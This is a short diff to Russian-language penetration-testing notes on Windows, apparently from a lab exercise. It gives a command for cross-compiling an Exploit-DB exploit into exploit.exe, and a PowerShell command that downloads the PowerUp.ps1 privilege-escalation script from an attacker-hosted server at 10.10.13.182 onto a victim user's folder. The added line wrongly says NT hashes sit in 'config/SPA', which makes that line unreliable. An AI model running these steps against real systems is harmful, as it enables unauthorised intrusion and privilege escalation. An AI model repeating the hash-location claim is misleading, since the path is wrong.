@@ -1,7 +1,9 @@
 
         Windows
                 Важненько, вот компиляция сплоитов под винду на лине, тулза mingw‐w64 (i686‐w64‐mingw32‐gcc 40564.c –o exploit.exe –lws2_32)
-                
+  
+  NT хеши по дефолту храняться в Windows/System32/config/SPA
+  
   Powershell команда для скачивания файлов: $client = new-object System.Net.WebClient
                                             $client.DownloadFile("http://10.10.13.182:8000/PowerUp.ps1","C:\Users\amanda\Documents\PowerUp.ps1")
   
